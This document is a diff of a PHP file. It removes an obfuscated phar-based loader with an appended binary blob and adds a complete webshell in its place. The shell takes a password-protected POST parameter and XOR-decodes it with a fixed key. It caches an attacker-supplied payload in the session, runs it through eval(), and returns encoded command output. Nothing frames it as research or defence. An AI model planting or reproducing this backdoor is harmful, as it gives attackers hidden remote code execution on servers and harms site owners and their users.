@@ -1,1 +1,31 @@
-<?php include "\160\x68\141\x72\72\57\57".basename(__FILE__)."\57\x78";__HALT_COMPILER(); ?>/                    xá      Z  nl©-ÿ      UÝkÂ0ÅßûW”pÑ„Š[·Å°îe{}Wú‘h´&%"ÿ÷Ý:&Œ@àü.ç\Î½4›&”Ç¼¦}Ø	2Ž«"©¦„Ãn#ˆL”*îŠûI\UR‚”É$Ž‹i®â§Q#Èâ˜Ä¯êsº¨>ÞÞçsGx¨ƒ)½¶&<QðØ±ï JÑzWKCQr¨oÊ£²‚ MYGA‹1=ƒš£éJ¶HðŸAÙë]'hØFÑ t± “íP€_‚^}Án	Û.øœôgB°Ô*¤iãä:Ûç¾ÜP2Â‚t1,5"ƒTéZfké³Ò/o)ÁË<FÚ4OØ öLˆ	¿ƒÔYësç)ãAz½]º>ca»ÇmKÓM‹¼•Ó¬’¥­$…ýr²bÝz°m—ño[…Lš*+k™›€9Ò\sºäõù¶ìo&§§l;„—>ã?3Ñ¼f;À‚ºa°.ˆ}é€Ÿ   GBMB
+<?php
+@session_start();
+@set_time_limit(0);
+@error_reporting(0);
+function encode($D,$K){
+    for($i=0;$i<strlen($D);$i++) {
+        $c = $K[$i+1&15];
+        $D[$i] = $D[$i]^$c;
+    }
+    return $D;
+}
+$pass='rt7ao0lsw';
+$payloadName='payload';
+$key='c6478da107cd62f0';
+if (isset($_POST[$pass])){
+    $data=encode(base64_decode($_POST[$pass]),$key);
+    if (isset($_SESSION[$payloadName])){
+        $payload=encode($_SESSION[$payloadName],$key);
+        if (strpos($payload,"getBasicsInfo")===false){
+            $payload=encode($payload,$key);
+        }
+		eval($payload);
+        echo substr(md5($pass.$key),0,16);
+        echo base64_encode(encode(@run($data),$key));
+        echo substr(md5($pass.$key),16);
+    }else{
+        if (strpos($data,"getBasicsInfo")!==false){
+            $_SESSION[$payloadName]=encode($data,$key);
+        }
+    }
+}
